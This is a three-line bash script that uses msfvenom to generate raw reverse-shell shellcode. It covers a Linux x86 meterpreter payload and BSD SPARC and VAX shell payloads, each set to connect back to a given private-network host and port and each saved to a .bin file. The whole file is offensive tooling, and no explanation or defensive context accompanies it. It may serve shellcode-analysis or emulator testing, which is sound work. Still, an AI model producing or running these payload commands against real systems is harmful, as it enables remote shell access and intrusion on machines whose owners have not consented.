#!/bin/bash

msfvenom -f raw -p linux/x86/meterpreter/reverse_tcp  LHOST=192.168.132.22 LPORT=31337 -o shellcode_1_x86.bin

msfvenom -f raw -p bsd/sparc/shell_reverse_tcp LHOST=172.16.2.200 LPORT=2600 -o shellcode_2_sparc.bin

msfvenom -f raw -p bsd/vax/shell_reverse_tcp LHOST=10.10.20.6 LPORT=443 -o shellcode_3_vax.bin
